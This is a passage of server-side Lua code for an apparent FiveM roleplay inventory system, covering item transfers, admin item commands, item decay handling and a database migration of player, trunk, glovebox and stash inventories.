			if AddItem(target, item.name, amount, false, item.info, true, item.created, item.metadata, item.decay) then
				TriggerClientEvent('inventory:client:ItemBox',target, AJFW.Shared.Items[item.name], "add")
				AJFW.Functions.Notify(target, Lang:t("notify.gitemrec")..amount..' '..item.label..Lang:t("notify.gitemfrom")..Player.PlayerData.charinfo.firstname.." "..Player.PlayerData.charinfo.lastname)
				TriggerClientEvent("inventory:client:UpdatePlayerInventory", target, true)
				TriggerClientEvent('inventory:client:ItemBox',src, AJFW.Shared.Items[item.name], "remove")
				AJFW.Functions.Notify(src, Lang:t("notify.gitemyg") .. OtherPlayer.PlayerData.charinfo.firstname.." "..OtherPlayer.PlayerData.charinfo.lastname.. " " .. amount .. " " .. item.label .."!")
				TriggerClientEvent("inventory:client:UpdatePlayerInventory", src, true)
				TriggerClientEvent('aj-inventory:client:giveAnim', src)
				TriggerClientEvent('aj-inventory:client:giveAnim', target)
			else
				AddItem(src, item.name, amount, item.slot, item.info, true, item.created, item.metadata, item.decay)
				AJFW.Functions.Notify(src, Lang:t("notify.gitinvfull"), "error")
				AJFW.Functions.Notify(target, Lang:t("notify.giymif"), "error")
				TriggerClientEvent("inventory:client:UpdatePlayerInventory", src, false)
				TriggerClientEvent("inventory:client:UpdatePlayerInventory", target, false)
			end
		else
			AJFW.Functions.Notify(src, Lang:t("notify.gitydhei"), "error")
		end
	else
		AJFW.Functions.Notify(src, Lang:t("notify.gitydhitt"))
	end
end)

RegisterNetEvent('inventory:server:snowball', function(action)
	if action == "add" then
		AddItem(source, "weapon_snowball", nil, nil, true)
	elseif action == "remove" then
		RemoveItem(source, "weapon_snowball", nil, nil, true)
	end
end)

RegisterNetEvent('inventory:server:addTrunkItems', function(plate, items)
	addTrunkItems(plate, items)
end)

RegisterNetEvent('inventory:server:addGloveboxItems', function(plate, items)
	addGloveboxItems(plate, items)
end)

AJFW.Functions.CreateCallback('aj-inventory:server:GetStashItems', function(_, cb, stashId)
	cb(GetStashItems(stashId))
end)

AJFW.Functions.CreateCallback('inventory:server:GetCurrentDrops', function(_, cb)
	cb(Drops)
end)

AJFW.Functions.CreateCallback('AJFW:HasItem', function(source, cb, items, amount)
	print("^3AJFW:HasItem is deprecated, please use AJFW.Functions.HasItem, it can be used on both server- and client-side and uses the same arguments.^0")
    local retval = false
    local Player = AJFW.Functions.GetPlayer(source)
    if not Player then return cb(false) end
    local isTable = type(items) == 'table'
    local isArray = isTable and table.type(items) == 'array' or false
    local totalItems = #items
    local count = 0
    local kvIndex = 2
    if isTable and not isArray then
        totalItems = 0
        for _ in pairs(items) do totalItems += 1 end
        kvIndex = 1
    end
    if isTable then
        for k, v in pairs(items) do
            local itemKV = {k, v}
            local item = GetItemByName(source, itemKV[kvIndex])
            if item and ((amount and item.amount >= amount) or (not amount and not isArray and item.amount >= v) or (not amount and isArray)) then
                count += 1
            end
        end
        if count == totalItems then
            retval = true
        end
    else -- Single item as string
        local item = GetItemByName(source, items)
        if item and not amount or (item and amount and item.amount >= amount) then
            retval = true
        end
    end
    cb(retval)
end)

AJFW.Functions.CreateCallback('AJFW:HasItemV2', function(source, cb, items, amount)
    local src, retval, item = source, false,nil
    local Player = AJFW.Functions.GetPlayer(src)
    if Player then
        if type(items) == 'table' then
            local count = 0
            local finalcount = 0
            for k, v in pairs(items) do
                if type(k) == 'string' then
                    finalcount = 0
                    for i, _ in pairs(items) do
                        if i then
                            finalcount = finalcount + 1
                        end
                    end
                    item = Player.Functions.GetItemByName(k)
                    if item then
                        if item.amount >= v then
                            count = count + 1
                            if count == finalcount then
                                retval = true
                            end
                        end
                    end
                else
                    finalcount = #items
                    item = Player.Functions.GetItemByName(v)
                    if item then
                        if amount then
                            if item.amount >= amount then
                                count = count + 1
                                if count == finalcount then
                                    retval = true
                                end
                            end
                        else
                            count = count + 1
                            if count == finalcount then
                                retval = true
                            end
                        end
                    end
                end
            end
        else
            item = Player.Functions.GetItemByName(items)
            if item then
                if amount then
                    if item.amount >= amount then
                        retval = true
                    end
                else
                    retval = true
                end
            end
        end
    end
    cb(retval, item)
end)
AJFW.Commands.Add("resetinv", "Reset Inventory (Admin Only)", {{name="type", help="stash/trunk/glovebox"},{name="id/plate", help="ID of stash or license plate"}}, true, function(source, args)
	local invType = args[1]:lower()
	table.remove(args, 1)
	local invId = table.concat(args, " ")
	if invType and invId then
		if invType == "trunk" then
			if Trunks[invId] then
				Trunks[invId].isOpen = false
			end
		elseif invType == "glovebox" then
			if Gloveboxes[invId] then
				Gloveboxes[invId].isOpen = false
			end
		elseif invType == "stash" then
			if Stashes[invId] then
				Stashes[invId].isOpen = false
			end
		else
			AJFW.Functions.Notify(source,  Lang:t("notify.navt"), "error")
		end
	else
		AJFW.Functions.Notify(source,  Lang:t("notify.anfoc"), "error")
	end
end, "admin")

AJFW.Commands.Add("rob", "Rob Player", {}, false, function(source, _)
	TriggerClientEvent("police:client:RobPlayer", source)
end)

AJFW.Commands.Add("giveitem", "Give An Item (Admin Only)", {{name="id", help="Player ID"},{name="item", help="Name of the item (not a label)"}, {name="amount", help="Amount of items"}}, false, function(source, args)
	local id = tonumber(args[1])
	local Player = AJFW.Functions.GetPlayer(id)
	local amount = tonumber(args[3]) or 1
	local itemData = AJFW.Shared.Items[tostring(args[2]):lower()]
	if Player then
			if itemData then
				-- check iteminfo
				local info = {}
				if itemData["name"] == "id_card" then
					info.citizenid = Player.PlayerData.citizenid
					info.firstname = Player.PlayerData.charinfo.firstname
					info.lastname = Player.PlayerData.charinfo.lastname
					info.birthdate = Player.PlayerData.charinfo.birthdate
					info.gender = Player.PlayerData.charinfo.gender
					info.nationality = Player.PlayerData.charinfo.nationality
				elseif itemData["name"] == "driver_license" then
					info.firstname = Player.PlayerData.charinfo.firstname
					info.lastname = Player.PlayerData.charinfo.lastname
					info.birthdate = Player.PlayerData.charinfo.birthdate
					info.type = "Class C Driver License"
				elseif itemData["type"] == "weapon" then
					amount = 1
					info.serie = tostring(AJFW.Shared.RandomInt(2) .. AJFW.Shared.RandomStr(3) .. AJFW.Shared.RandomInt(1) .. AJFW.Shared.RandomStr(2) .. AJFW.Shared.RandomInt(3) .. AJFW.Shared.RandomStr(4))
					info.quality = 100
				elseif itemData["name"] == "harness" then
					info.uses = 20
				elseif itemData["name"] == "syphoningkit" then
					info.gasamount = 0
				elseif itemData["name"] == "jerrycan" then
					info.gasamount = 0
				elseif itemData["name"] == "markedbills" then
					info.worth = math.random(5000, 10000)
				elseif itemData["name"] == "labkey" then
					info.lab = exports["aj-methlab"]:GenerateRandomLab()
				elseif itemData["name"] == "printerdocument" then
					info.url = "https://cdn.discordapp.com/attachments/870094209783308299/870104331142189126/Logo_-_Display_Picture_-_Stylized_-_Red.png"
				elseif AJFW.Shared.Items[itemData["name"]]["decay"] and AJFW.Shared.Items[itemData["name"]]["decay"] > 0 then
					info.quality = 100
				end

				if AddItem(id, itemData["name"], amount, false, info, true) then
					AJFW.Functions.Notify(source, Lang:t("notify.yhg") ..GetPlayerName(id).." "..amount.." "..itemData["name"].. "", "success")
				else
					AJFW.Functions.Notify(source,  Lang:t("notify.cgitem"), "error")
				end
			else
				AJFW.Functions.Notify(source,  Lang:t("notify.idne"), "error")
			end
	else
		AJFW.Functions.Notify(source,  Lang:t("notify.pdne"), "error")
	end
end, "admin")

AJFW.Commands.Add("randomitems", "Give Random Items (God Only)", {}, false, function(source, _)
	local filteredItems = {}
	for k, v in pairs(AJFW.Shared.Items) do
		if AJFW.Shared.Items[k]["type"] ~= "weapon" then
			filteredItems[#filteredItems+1] = v
		end
	end
	for _ = 1, 10, 1 do
		local randitem = filteredItems[math.random(1, #filteredItems)]
		local amount = math.random(1, 10)
		if randitem["unique"] then
			amount = 1
		end
		if AddItem(source, randitem["name"], amount, nil, nil, true) then
			TriggerClientEvent('inventory:client:ItemBox', source, AJFW.Shared.Items[randitem["name"]], 'add')
            Wait(500)
		end
	end
end, "dev")

AJFW.Commands.Add('clearinv', 'Clear Players Inventory (Admin Only)', { { name = 'id', help = 'Player ID' } }, false, function(source, args)
    local playerId = args[1] ~= '' and tonumber(args[1]) or source
    local Player = AJFW.Functions.GetPlayer(playerId)
    if Player then
        ClearInventory(playerId)
    else
        AJFW.Functions.Notify(source, "Player not online", 'error')
    end
end, 'admin')





CreateThread(function()
	while true do
		for k, v in pairs(Drops) do
			if v and (v.createdTime + Config.CleanupDropTime < os.time()) and not Drops[k].isOpen then
				Drops[k] = nil
				TriggerClientEvent("inventory:client:RemoveDropItem", -1, k)
			end
		end
		Wait(60 * 1000)
	end
end)

local function ConvertQuality(item)
	local item = item
	if item.decay then 
		local DecayRate = (not AJFW.Shared.Items[item.name:lower()]["StopDecay"] and AJFW.Shared.Items[item.name:lower()]["decay"] ~= nil and AJFW.Shared.Items[item.name:lower()]["decay"] ) or (AJFW.Shared.Items[item.name:lower()]["StopDecay"] and 0.0) or 0.0
		local retval = {}
		if DecayRate == nil then
            DecayRate = 0
        end
		
		retval = exports['aj-inventory-helper']:Convert(item.metadata.data, DecayRate)
        return retval[1], retval[2], retval[3]
    else
		return 100, item.metadata.count, item.metadata.data
    end
end

AJFW.Functions.CreateCallback('inventory:server:ConvertQuality', function(source, cb, inventory, other)
	local src = source
	local data = {}
	local Player = AJFW.Functions.GetPlayer(src)
	if Player then
		for index, item in pairs(inventory) do
			local itemDatas = deep_copy(item)
			if itemDatas.created then
				if AJFW.Shared.Items[itemDatas.name:lower()]["decay"] or AJFW.Shared.Items[itemDatas.name:lower()]["decay"] ~= 0 then
					if itemDatas.info and itemDatas.decay then
						if type(itemDatas.info) ~= "table" then
							itemDatas.info = {}
						end
						if itemDatas.info.quality == nil then
							itemDatas.info.quality = 100
						end
					else
						local info = {quality = 100}
						itemDatas.info = info
					end
					local quality, count, metadata = ConvertQuality(itemDatas)
					if itemDatas.info.quality then
						if quality < itemDatas.info.quality then
							itemDatas.info.quality = quality
						end
					else
						itemDatas.info = {quality = quality}
					end
					itemDatas.metadata = {
						count = count,
						data = metadata
					}
				end
			end
			inventory[index] = itemDatas
			AJFW.Debug(inventory[index])
		end
		if other then
			local inventoryType = AJFW.Shared.SplitStr(other.name, "-")[1]
			local uniqueId = AJFW.Shared.SplitStr(other.name, "-")[2] -- Dropped None
			if inventoryType == "trunk" then
				for index, item in pairs(other.inventory) do
					local itemDatas = deep_copy(item)
					if item.created and item.decay then
						if AJFW.Shared.Items[item.name:lower()]["decay"] or AJFW.Shared.Items[item.name:lower()]["decay"] ~= 0 then
							if item.info then
								if type(item.info) ~= "table" then
									item.info = {}
								end
								if item.info.quality == nil then
									item.info.quality = 100
								end
							else
								local info = {quality = 100}
								item.info = info
							end
							local quality, count, metadata = ConvertQuality(itemDatas)
							if item.info.quality then
								if quality < item.info.quality then
									item.info.quality = quality
								end
							else
								item.info = {quality = quality}
							end
							itemDatas.metadata = {
								count = count,
								data = metadata
							}
						end
					end
					other.inventory[index] = itemDatas
				end
				Trunks[uniqueId].items = other.inventory
				TriggerClientEvent("inventory:client:UpdateOtherInventory", Player.PlayerData.source, other.inventory, false)
			elseif inventoryType == "glovebox" then
				for index, item in pairs(other.inventory) do
					local itemDatas = deep_copy(item)
					if item.created and item.decay then
						if AJFW.Shared.Items[item.name:lower()]["decay"] or AJFW.Shared.Items[item.name:lower()]["decay"] ~= 0 then
							if item.info then
								if type(item.info) ~= "table" then
									item.info = {}
								end
								if item.info.quality == nil then
									item.info.quality = 100
								end
							else
								local info = {quality = 100}
								item.info = info
							end
							local quality, count, metadata = ConvertQuality(itemDatas)
							if item.info.quality then
								if quality < item.info.quality then
									item.info.quality = quality
								end
							else
								item.info = {quality = quality}
							end
							itemDatas.metadata = {
								count = count,
								data = metadata
							}
						end
					end
					other.inventory[index] = itemDatas
				end
				Gloveboxes[uniqueId].items = other.inventory
				TriggerClientEvent("inventory:client:UpdateOtherInventory", Player.PlayerData.source, other.inventory, false)
			elseif inventoryType == "stash" then
				for index, item in pairs(other.inventory) do
					local itemDatas = deep_copy(item)
					if item.created and item.decay then
						if AJFW.Shared.Items[item.name:lower()]["decay"] or AJFW.Shared.Items[item.name:lower()]["decay"] ~= 0 then
							if item.info then
								if type(item.info) ~= "table" then
									item.info = {}
								end
								if item.info.quality == nil then
									item.info.quality = 100
								end
							else
								local info = {quality = 100}
								item.info = info
							end
							local quality, count, metadata = ConvertQuality(itemDatas)
							if item.info.quality then
								if quality < item.info.quality then
									item.info.quality = quality
								end
							else
								item.info = {quality = quality}
							end
							itemDatas.metadata = {
								count = count,
								data = metadata
							}
						end
					end
					other.inventory[index] = itemDatas
				end
				Stashes[uniqueId].items = other.inventory
				TriggerClientEvent("inventory:client:UpdateOtherInventory", Player.PlayerData.source, other.inventory, false)
			elseif inventoryType == "Dropped" then
				for index, item in pairs(other.inventory) do
					local itemDatas = deep_copy(item)
					if item.created and item.decay then
						if AJFW.Shared.Items[item.name:lower()]["decay"] or AJFW.Shared.Items[item.name:lower()]["decay"] ~= 0 then
							if item.info then
								if type(item.info) ~= "table" then
									item.info = {}
								end
								if item.info.quality == nil then
									item.info.quality = 100
								end
							else
								local info = {quality = 100}
								item.info = info
							end
							local quality, count, metadata = ConvertQuality(itemDatas)
							if item.info.quality then
								if quality < item.info.quality then
									item.info.quality = quality
								end
							else
								item.info = {quality = quality}
							end
							itemDatas.metadata = {
								count = count,
								data = metadata
							}
						end
					end
					other.inventory[index] = itemDatas
				end
				Drops[uniqueId].items = other.inventory
				TriggerClientEvent("inventory:client:UpdateOtherInventory", Player.PlayerData.source, other.inventory, false)
			end
		end
		Player.Functions.SetInventory(inventory)
		TriggerClientEvent("inventory:client:UpdatePlayerInventory", Player.PlayerData.source, false)
	end
    data.inventory = inventory
    data.other = other
	cb(data)
end)

AddEventHandler('playerDropped', function(reason)
    local src = source
	for k,v in pairs(InventoryOpen) do
		if v == src then
			InventoryOpen[k] = nil
			break
		end
	end
end)

AddEventHandler('playerDropped', function()
    local src = source
    local inventories = { Stashes, Trunks, Gloveboxes, Drops }
    for _, inventory in pairs(inventories) do
        for _, inv in pairs(inventory) do
            if inv.isOpen == src then
                inv.isOpen = false
            end
        end
    end
end)

RegisterNetEvent('aj-inventory:server:Ensures', function()
	local src = source
	for k,v in pairs(InventoryOpen) do
		if v == src then
			InventoryOpen[k] = nil
			break
		end
	end
end)

local function CustomDebug(message, type)
	local type = type or '^7'
	print('^7==============================================================^7')
	print('^1aj-Inventory: '..type..message..'^7')
	print('^7==============================================================^7')
end

local updateMetadataAswell = false

local function EnsureItem(item, itemInfo)
	local time = os.time()
	if not item.info then
		item.info = {}
		item.info.quality = 100
	else
		if not item.info.quality then
			item.info.quality = 100
		end
	end
	if not item.created then
		item.created = time
	end
	if not item.amount then
		item.amount = 1
	end
    if item.decay then
        item.metadata = {}
        for i = 1, item.amount do
            item.metadata[#item.metadata + 1] = {
                created = item.created,
                quality = item.info.quality
            }
        end
    else
        item.metadata = {}
        item.metadata[#item.metadata + 1] = {
            created = item.created,
            quality = item.info.quality
        }
    end
	local data = {
		name = itemInfo['name'],
		amount = item.amount,
		info = item.info or '',
		label = itemInfo['label'],
		description = itemInfo['description'] or '',
		weight = itemInfo['weight'],
		type = itemInfo['type'],
		unique = itemInfo['unique'],
		useable = itemInfo['useable'],
		image = itemInfo['image'],
		shouldClose = itemInfo['shouldClose'],
		slot = item.slot,
		combinable = itemInfo['combinable'],
		created = item.created,
		metadata = {
			count = #item.metadata,
			data = exports['aj-inventory-helper']:Encode(item.metadata)
		},
		decay = item.decay,
	}
	return data
end

local function EnsureItem2(item, itemInfo)
	local time = os.time()
	if not item.info then
		item.info = {}
		item.info.quality = 100
	else
		if not item.info.quality then
			item.info.quality = 100
		end
	end
	if not item.created then
		item.created = time
	end
	if not item.amount then
		item.amount = 1
	end
    if item.decay then
        item.metadata = {}
        for i = 1, item.amount do
            item.metadata[#item.metadata + 1] = {
                created = item.created,
                quality = item.info.quality
            }
        end
    else
        item.metadata = {}
        item.metadata[#item.metadata + 1] = {
            created = item.created,
            quality = item.info.quality
        }
    end
	local data = {
		name = itemInfo['name'],
		amount = item.amount,
		info = item.info or '',
		label = itemInfo['label'],
		description = itemInfo['description'] or '',
		weight = itemInfo['weight'],
		type = itemInfo['type'],
		unique = itemInfo['unique'],
		useable = itemInfo['useable'],
		image = itemInfo['image'],
		slot = item.slot,
		created = item.created,
		metadata = {
			count = #item.metadata,
			data = exports['aj-inventory-helper']:Encode(item.metadata)
		},
		decay = item.decay,
	}
	return data
end

local seconds = 0

local function ConvertInventorytoMy()

	CustomDebug('Collecting Player Inventories From Database', '^3')
	
	local player_inventories = MySQL.prepare.await('SELECT citizenid, inventory FROM players')
	player_inventories = player_inventories or {}
	CustomDebug('Collected '..#player_inventories..' Player Inventories', '^2')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Collecting Gloveboxes From Database', '^3')

	local g_inventories = MySQL.prepare.await('SELECT * FROM gloveboxitems')
	g_inventories = g_inventories or {}
	CustomDebug('Collected '..#g_inventories..' Gloveboxes', '^2')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Collecting Trunks From Database', '^3')

	local t_inventories = MySQL.prepare.await('SELECT * FROM trunkitems')
	t_inventories = t_inventories or {}
	CustomDebug('Collected '..#t_inventories..' Trunks', '^2')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Collecting Stashes From Database', '^3')

	local s_inventories = MySQL.prepare.await('SELECT * FROM stashitems')
	s_inventories = s_inventories or {}
	CustomDebug('Collected '..#s_inventories..' Stashes', '^2')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Starting Converting Player Inventories', '^3')

	for i=1, #player_inventories do
		Wait(500)
		seconds = seconds + 0.5
		CustomDebug('Currently Working on ^8CitizenID: ^5'..player_inventories[i].citizenid..'^6', '^6')
		local inventory = player_inventories[i].inventory
		inventory = json.decode(inventory)
		for _, item in pairs(inventory) do
			if item then
				-- AJFW.Debug(item)
				local itemInfo = AJFW.Shared.Items[item.name:lower()]
				if itemInfo then
					inventory[item.slot] = EnsureItem(item, itemInfo)
				end
			end
		end
		inventory = json.encode(inventory)
		local affectedRows = MySQL.update.await('UPDATE players SET inventory = ? WHERE citizenid = ?', {
			inventory,
			player_inventories[i].citizenid
		})
		if affectedRows >= 1 then
			CustomDebug('Conversion Successfull ^8CitizenID: ^5'..player_inventories[i].citizenid..'^6', '^6')
		else
			CustomDebug('Failed Conversion or No Need ^8CitizenID: ^5'..player_inventories[i].citizenid..'^6', '^1')
		end
	end

	CustomDebug('Finished Converting Player Inventories', '^3')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Starting Converting Gloveboxes', '^3')

	for i=1, #g_inventories do
		CustomDebug('Currently Working on ^Glovebox Plate: ^5'..g_inventories[i].plate..'^6', '^6')
		Wait(500)
		seconds = seconds + 0.5
		local inventory = g_inventories[i].items
		inventory = json.decode(inventory)
		for _, item in pairs(inventory) do
			if item then
				local itemInfo = AJFW.Shared.Items[item.name:lower()]
				if itemInfo then
					inventory[item.slot] = EnsureItem2(item, itemInfo)
				end
			end
		end
		inventory = json.encode(inventory)
		local affectedRows = MySQL.update.await('UPDATE gloveboxitems SET items = ? WHERE plate = ?', {
			inventory,
			g_inventories[i].plate
		})
		if affectedRows >= 1 then
			CustomDebug('Conversion Successfull ^Glovebox Plate: ^5'..g_inventories[i].plate..'^6', '^6')
		else
			CustomDebug('Failed Conversion or No Need ^Glovebox Plate: ^5'..g_inventories[i].plate..'^6', '^1')
		end
	end

	CustomDebug('Finished Converting Gloveboxes', '^3')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Starting Converting Trunks', '^3')

	for i=1, #t_inventories do
		CustomDebug('Currently Working on ^Trunk Plate: ^5'..t_inventories[i].plate..'^6', '^6')
		Wait(500)
		seconds = seconds + 0.5
		local inventory = t_inventories[i].items
		inventory = json.decode(inventory)
		for _, item in pairs(inventory) do
			if item then
				local itemInfo = AJFW.Shared.Items[item.name:lower()]
				if itemInfo then
					inventory[item.slot] = EnsureItem2(item, itemInfo)
				end
			end
		end
		inventory = json.encode(inventory)
		local affectedRows = MySQL.update.await('UPDATE trunkitems SET items = ? WHERE plate = ?', {
			inventory,
			t_inventories[i].plate
		})
		if affectedRows >= 1 then
			CustomDebug('Conversion Successfull ^Trunk Plate: ^5'..t_inventories[i].plate..'^6', '^6')
		else
			CustomDebug('Failed Conversion or No Need ^Trunk Plate: ^5'..t_inventories[i].plate..'^6', '^1')
		end
	end

	CustomDebug('Finished Converting Trunks', '^3')

	Wait(100)
	seconds = seconds + 0.1

	CustomDebug('Starting Converting Stashes', '^3')

	for i=1, #s_inventories do
		CustomDebug('Currently Working on ^Stash: ^5'..s_inventories[i].stash..'^6', '^6')
		Wait(500)
		seconds = seconds + 0.5
		local inventory = s_inventories[i].items
		inventory = json.decode(inventory)
		for _, item in pairs(inventory) do
			if item then
				local itemInfo = AJFW.Shared.Items[item.name:lower()]
				if itemInfo then
					inventory[item.slot] = EnsureItem2(item, itemInfo)
				end
			end
		end
		inventory = json.encode(inventory)
		local affectedRows = MySQL.update.await('UPDATE stashitems SET items = ? WHERE stash = ?', {
			inventory,
			s_inventories[i].stash
		})
		if affectedRows >= 1 then
			CustomDebug('Conversion Successfull ^Stash: ^5'..s_inventories[i].stash..'^6', '^6')
		else
			CustomDebug('Failed Conversion or No Need ^Stash: ^5'..s_inventories[i].stash..'^6', '^1')
		end
	end

	CustomDebug('Finished Converting Stashes', '^3')
	CustomDebug('Conversion took Approx '..seconds..' seconds', '^7')

end

if Config.Converter then
	CreateThread(function()
		ConvertInventorytoMy()
	end)
end

function GetSlots(identifier)
    local inventory, maxSlots
    local player = AJFW.Functions.GetPlayer(identifier)
    if player then
        inventory = player.PlayerData.items
        maxSlots = Config.MaxSlots
    elseif Trunks[identifier] then
        inventory = Trunks[identifier].items
        maxSlots = Trunks[identifier].slots
	elseif Gloveboxes[identifier] then
        inventory = Gloveboxes[identifier].items
        maxSlots = Gloveboxes[identifier].slots
	elseif Stashes[identifier] then
        inventory = Stashes[identifier].items
        maxSlots = Stashes[identifier].slots
    elseif Drops[identifier] then
        inventory = Drops[identifier].items
        maxSlots = Drops[identifier].slots
    end
    if not inventory then return 0, maxSlots end
    local slotsUsed = 0
    for _, v in pairs(inventory) do
        if v then
            slotsUsed = slotsUsed + 1
        end
    end
    local slotsFree = maxSlots - slotsUsed
    return slotsUsed, slotsFree
end

exports('GetSlots', GetSlots)